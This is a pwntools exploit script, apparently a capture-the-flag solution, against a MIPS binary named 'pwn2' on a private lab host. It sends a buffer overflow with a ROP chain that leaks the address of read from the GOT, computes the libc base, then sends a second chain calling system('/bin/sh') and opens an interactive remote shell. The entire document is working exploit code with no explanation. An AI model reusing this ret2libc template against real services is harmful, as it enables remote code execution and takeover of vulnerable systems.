from pwn import *
context.log_level = 'debug'
libc=ELF("./lib/libc.so.0")
elf = ELF('./pwn2')
io = remote("192.168.3.26", 8080)
s       = lambda data               :io.send(str(data)) 
sa      = lambda delim,data         :io.sendafter(str(delim), str(data))
sl      = lambda data               :io.sendline(str(data))
sla     = lambda delim,data         :io.sendlineafter(str(delim), str(data))
r       = lambda numb=4096          :io.recv(numb)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)

ru("What's your name: \n")
sl("fuyeqi")
sleep(0.2)
r()

#leak got
j2s2_s1a0=0x004007A8#gadget
j_s3210=0x004006C8
main=0x00400820
c=''
c+='\x31'*0x24
c+=p32(j_s3210)
c+='\x31'*0x1c
c+=p32(1111)#s0
c+=p32(elf.got['read'])#s1
c+=p32(0x0040092C)#s2
c+=p32(1111)#s3
c+=p32(j2s2_s1a0)#ra
c+='\x20'*0x20#why
c+=p32(0x400750)#why
sl(c)

#libcbase
read_addr=u32(r()[0:4])
libc.address=read_addr-libc.symbols['read']

#getshell
c=''
c+='\x31'*0x24
c+=p32(j_s3210)
c+='\x31'*0x1c
c+=p32(1111)#s0
c+=p32(libc.search('/bin/sh').next())#s1
c+=p32(libc.symbols['system'])#s2
c+=p32(1111)#s3
c+=p32(j2s2_s1a0)#ra
sl(c)

io.interactive()
